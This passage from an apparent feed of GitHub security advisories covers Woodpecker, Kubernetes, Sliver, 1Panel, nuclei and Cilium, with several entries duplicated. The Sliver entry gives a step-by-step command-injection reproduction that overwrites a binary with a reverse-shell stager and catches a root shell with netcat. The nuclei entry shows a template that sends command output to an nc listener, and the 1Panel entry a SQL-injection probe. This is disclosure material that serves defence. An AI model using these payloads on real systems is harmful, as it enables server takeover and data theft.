            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker] Woodpecker's custom environment variables allow to alter execution flow of plugins]]></title>
        <id>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</id>
        <link href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"/>
        <updated>2024-07-22T13:17:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>
<a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront of running</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41122">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>
<li><a href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom environment variables allow to alter execution flow of plugins]]></title>
        <id>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</id>
        <link href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"/>
        <updated>2024-07-22T13:17:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>
<a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront of running</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41122">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>
<li><a href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs]]></title>
        <id>https://github.com/advisories/GHSA-82m2-cv7p-4m75</id>
        <link href="https://github.com/advisories/GHSA-82m2-cv7p-4m75"/>
        <updated>2024-07-18T21:58:16.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\Users&nbsp;may be able to read container logs and NT AUTHORITY\Authenticated Users&nbsp;may be able to modify container logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5321">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/126161">https://github.com/kubernetes/kubernetes/issues/126161</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>
<li><a href="https://github.com/advisories/GHSA-82m2-cv7p-4m75">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82m2-cv7p-4m75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T21:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs]]></title>
        <id>https://github.com/advisories/GHSA-82m2-cv7p-4m75</id>
        <link href="https://github.com/advisories/GHSA-82m2-cv7p-4m75"/>
        <updated>2024-07-18T21:58:16.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\Users&nbsp;may be able to read container logs and NT AUTHORITY\Authenticated Users&nbsp;may be able to modify container logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5321">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/126161">https://github.com/kubernetes/kubernetes/issues/126161</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>
<li><a href="https://github.com/advisories/GHSA-82m2-cv7p-4m75">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82m2-cv7p-4m75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T21:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs]]></title>
        <id>https://github.com/advisories/GHSA-82m2-cv7p-4m75</id>
        <link href="https://github.com/advisories/GHSA-82m2-cv7p-4m75"/>
        <updated>2024-07-18T21:58:16.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\Users&nbsp;may be able to read container logs and NT AUTHORITY\Authenticated Users&nbsp;may be able to modify container logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5321">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/126161">https://github.com/kubernetes/kubernetes/issues/126161</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>
<li><a href="https://github.com/advisories/GHSA-82m2-cv7p-4m75">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82m2-cv7p-4m75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T21:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs]]></title>
        <id>https://github.com/advisories/GHSA-82m2-cv7p-4m75</id>
        <link href="https://github.com/advisories/GHSA-82m2-cv7p-4m75"/>
        <updated>2024-07-18T21:58:16.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\Users&nbsp;may be able to read container logs and NT AUTHORITY\Authenticated Users&nbsp;may be able to modify container logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5321">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/126161">https://github.com/kubernetes/kubernetes/issues/126161</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>
<li><a href="https://github.com/advisories/GHSA-82m2-cv7p-4m75">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82m2-cv7p-4m75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T21:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/bishopfox/sliver] Sliver Allows Authenticated Operator-to-Server Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-hc5w-gxxr-w8x8</id>
        <link href="https://github.com/advisories/GHSA-hc5w-gxxr-w8x8"/>
        <updated>2024-07-19T14:04:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Sliver version 1.6.0 (prerelease) is vulnerable to RCE on the teamserver by a low-privileged "operator" user. The RCE is as the system root user.</p>
<h2 id="impact">Impact</h2>
<p>As described in a <a href="https://github.com/BishopFox/sliver/issues/65">past issue</a>, "there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server." An operator who exploited this vulnerability would be able to view all console logs, kick all other operators, view and modify files stored on the server, and ultimately delete the server.</p>
<h2 id="reproduction">Reproduction</h2>
<p>First configure the Sliver server <a href="https://sliver.sh/docs?name=Multi-player+Mode">in multiplayer mode and add an operator profile</a>.</p>
<p>Next, compile a slightly older version of the Sliver client. The commit after 5016fb8d updates the Cobra command-line parsing library in the Sliver client to strictly validate command flags.</p>
<pre><code>git checkout 5016fb8d
VERSION=1.6.0 make client
</code></pre>
<p>The latest server version is targeted:</p>
<pre><code>All hackers gain exalted
[*] Server v1.6.0 - bdfd89167dd47aece2397c638d482f94f3f91cba
[*] Client 1.6.0 - 5016fb8d7cdff38c79e22e8293e58300f8d3bd57
[*] Welcome to the sliver shell, please type 'help' for options`
</code></pre>
<p>The exploit uses a command injection in the <code>generate msf-stager</code> to inject the <code>--out</code> flag to <code>msfvenom</code>. We overwrite Sliver's own go binary at <code>/root/.sliver/go/bin/go</code>:</p>
<pre><code>sliver &gt; generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&amp;--payload=linux/x64/shell_reverse_tcp&amp;--format=elf&amp;--out=/root/.sliver/go/bin/go

[*] Sliver implant stager saved to: [...]
</code></pre>
<p>The other injected flags are to force a Linux payload, and not necessary if running the Sliver server on Windows.</p>
<p>If you check the saved implant locally on the client, it's 0 bytes as the output got written to the file on the server instead.</p>
<p>On the attacking machine, setup a netcat shell:</p>
<pre><code>$ nc -lvp 8888
Listening on 0.0.0.0 8888
</code></pre>
<p>Trigger the stager by running a command which executes <code>/root/.sliver/go/bin/go</code>:</p>
<pre><code>sliver &gt; generate beacon --mtls 1.2.3.4
[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
 ⠼  Compiling, please wait ...
</code></pre>
<p>A root shell will pop:</p>
<pre><code>$ nc -lvp 8888
Listening on 0.0.0.0 8888
Connection received on 192.168.0.183 39238
whoami
root
</code></pre>
<p>The vulnerable code was introduced in <a href="https://github.com/BishopFox/sliver/pull/1281">https://github.com/BishopFox/sliver/pull/1281</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8">https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8</a></li>
<li><a href="https://github.com/BishopFox/sliver/pull/1281">https://github.com/BishopFox/sliver/pull/1281</a></li>
<li><a href="https://github.com/BishopFox/sliver/commit/0deaee625d14c6f05f63c86e5c3b7ae623a1138f">https://github.com/BishopFox/sliver/commit/0deaee625d14c6f05f63c86e5c3b7ae623a1138f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41111">https://nvd.nist.gov/vuln/detail/CVE-2024-41111</a></li>
<li><a href="https://github.com/BishopFox/sliver/issues/65">https://github.com/BishopFox/sliver/issues/65</a></li>
<li><a href="https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57">https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57</a></li>
<li><a href="https://sliver.sh/docs?name=Multi-player+Mode">https://sliver.sh/docs?name=Multi-player+Mode</a></li>
<li><a href="https://github.com/advisories/GHSA-hc5w-gxxr-w8x8">https://github.com/advisories/GHSA-hc5w-gxxr-w8x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hc5w-gxxr-w8x8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-18T20:23:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/1Panel-dev/1Panel] 1Panel has an SQL injection issue related to the orderBy clause]]></title>
        <id>https://github.com/advisories/GHSA-5grx-v727-qmq6</id>
        <link href="https://github.com/advisories/GHSA-5grx-v727-qmq6"/>
        <updated>2024-07-18T19:45:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There are many sql injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs.
The proof is as follows</p>
<h3 id="details-（one-of-them-）">Details （one of them ）</h3>
<img src="https://github.com/1Panel-dev/1Panel/assets/129351704/895b7b43-9bc0-44b3-9c84-24c2dcc962da" alt="image" width="697">
<img src="https://github.com/1Panel-dev/1Panel/assets/129351704/1b8eb866-9865-4bef-a359-53335d709157" alt="image" width="936">
<img src="https://github.com/1Panel-dev/1Panel/assets/129351704/e865d6d0-7ecb-49f7-b4a2-f1b0bc407986" alt="image" width="684">


<h3 id="poc">PoC</h3>
<p>curl '<a href="http://api:30455/api/v1/hosts/command/search">http://api:30455/api/v1/hosts/command/search</a>' {"page":1,"pageSize":10,"groupID":0,"orderBy":"<strong>3</strong>","order":"ascending","name":"a"}
<img src="https://github.com/1Panel-dev/1Panel/assets/129351704/250d5a2a-cb32-44dc-9831-86dbc2f2b43f" alt="image" width="664">
for example as picture . just change orderby‘s num we can know How many columns does the data table have.Parameters require strict whitelist filtering</p>
<h3 id="impact">Impact</h3>
<p>RCE、data leak.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6</a></li>
<li><a href="https://github.com/1Panel-dev/1Panel/commit/ff549a47937c1314e6ee08453a1d2128242440cd">https://github.com/1Panel-dev/1Panel/commit/ff549a47937c1314e6ee08453a1d2128242440cd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39907">https://nvd.nist.gov/vuln/detail/CVE-2024-39907</a></li>
<li><a href="https://github.com/advisories/GHSA-5grx-v727-qmq6">https://github.com/advisories/GHSA-5grx-v727-qmq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5grx-v727-qmq6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-18T14:25:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/projectdiscovery/nuclei/v3] projectdiscovery/nuclei allows unsigned code template execution through workflows]]></title>
        <id>https://github.com/advisories/GHSA-c3q9-c27p-cw9h</id>
        <link href="https://github.com/advisories/GHSA-c3q9-c27p-cw9h"/>
        <updated>2024-07-17T19:32:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Find a way to execute code template without -code option and signature.</p>
<h3 id="details">Details</h3>
<p>write a <code>code.yaml</code>:</p>
<pre><code class="language-yaml">id: code

info:
  name: example code template
  author: ovi3


code:
  - engine:
      - sh
      - bash
    source: |
      id

http:
  - raw:
      - |
        POST /re HTTP/1.1
        Host: {{Hostname}}

        {{code_response}}

workflows:
  - matchers:
    - name: t
</code></pre>
<p>using nc to listen on 80:</p>
<pre><code class="language-bash">nc -lvvnp 80
</code></pre>
<p>execute PoC template with nuclei:</p>
<pre><code class="language-bash">./nuclei -disable-update-check  -w code.yaml -u http://127.0.0.1 -vv -debug
</code></pre>
<p>and nc will get <code>id</code> command output.</p>
<p>We use <code>-w</code> to specify a workflow file, not <code>-t</code> to template file. and notice there is a <code>workflows</code> field in code.yaml to pretend to be a workflow file.</p>
<p>Test in Linux and Nuclei v3.2.9</p>
<h3 id="impact">Impact</h3>
<p>Some web applications inherit from Nuclei and allow users to edit and execute workflow files. In this case, users can execute arbitrary commands. (Although, as far as I know, most web applications use -t to execute)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h">https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40641">https://nvd.nist.gov/vuln/detail/CVE-2024-40641</a></li>
<li><a href="https://github.com/advisories/GHSA-c3q9-c27p-cw9h">https://github.com/advisories/GHSA-c3q9-c27p-cw9h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c3q9-c27p-cw9h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-17T19:32:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between pods when using Wireguard and an external kvstore]]></title>
        <id>https://github.com/advisories/GHSA-x989-52fc-4vr4</id>
        <link href="https://github.com/advisories/GHSA-x989-52fc-4vr4"/>
        <updated>2024-07-17T17:13:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For Cilium users who have enabled <a href="https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore">an external kvstore</a> and <a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">Wireguard transparent encryption</a>, traffic between pods in the affected cluster is not encrypted.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects Cilium v1.14 before v1.14.7.</p>
<p>This issue has been patched in Cilium v1.14.7.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue - affected users are encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @giorio94 and @gandro for their work on triaging and remediating this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-x989-52fc-4vr4">https://github.com/cilium/cilium/security/advisories/GHSA-x989-52fc-4vr4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25631">https://nvd.nist.gov/vuln/detail/CVE-2024-25631</a></li>
<li><a href="https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore">https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.7">https://github.com/cilium/cilium/releases/tag/v1.14.7</a></li>
<li><a href="https://github.com/advisories/GHSA-x989-52fc-4vr4">https://github.com/advisories/GHSA-x989-52fc-4vr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x989-52fc-4vr4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-20T23:45:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted ingress/health traffic when using Wireguard transparent encryption]]></title>
        <id>https://github.com/advisories/GHSA-7496-fgv9-xw82</id>
        <link href="https://github.com/advisories/GHSA-7496-fgv9-xw82"/>
        <updated>2024-07-17T17:12:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For Cilium users who are using CRDs to store Cilium state (the default configuration) and <a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">Wireguard transparent encryption</a>, responses from pods to the Ingress and health endpoints are not encrypted. Traffic from the Ingress and health endpoints to pods is not affected by this issue. The health endpoint is only used for Cilium's internal health checks.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects Cilium v1.14 before v1.14.7.</p>
<p>This issue has been patched in Cilium v1.14.7.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue - affected users are encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @gandro for their work on triaging and remediating this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
